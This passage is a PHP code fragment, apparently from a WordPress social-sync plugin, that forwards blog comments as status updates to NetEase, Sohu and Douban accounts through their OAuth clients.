					$content = at_username($name['netease'], $username['netease'], $wptm_connect['netease_username'], $comment_content);
					$status = wp_status('评论《' . $title . '》: ' . $content, $url, 163);
					$result = $to -> update($status);
				} 
			} elseif ($tid == 'shtid') {
				$login = get_user_meta($user_id, 'login_sohu', true);
				if ($login[0] && $login[1]) {
					if (!class_exists('sohuOAuth')) {
						include dirname(__FILE__) . '/OAuth/sohu_OAuth.php';
					} 
					$to = new sohuClient(SOHU_APP_KEY, SOHU_APP_SECRET, $login[0], $login[1]);
					$content = at_username($name['sohu'], $username['sohu'], $wptm_connect['sohu_username'], $comment_content);
					$status = wp_status('评论《' . $title . '》: ' . $content, urlencode($url), 140, 1);
					$result = $to -> update($status);
				} 
			} elseif ($tid == 'dtid') {
				if ($login = get_user_meta($user_id, 'login_douban', true)) {
					if ($login[0] && $login[1]) {
						if (!class_exists('doubanOAuth')) {
							include dirname(__FILE__) . '/OAuth/douban_OAuth.php';
						} 
						$to = new doubanClient(DOUBAN_APP_KEY, DOUBAN_APP_SECRET, $login[0], $login[1]);
						$status = wp_status('评论《' . $title . '》: ' . $comment_content, $url, 128);
						$result = $to -> update($status);
					} 
				} 
			} 
		} 
	} 
} 

?>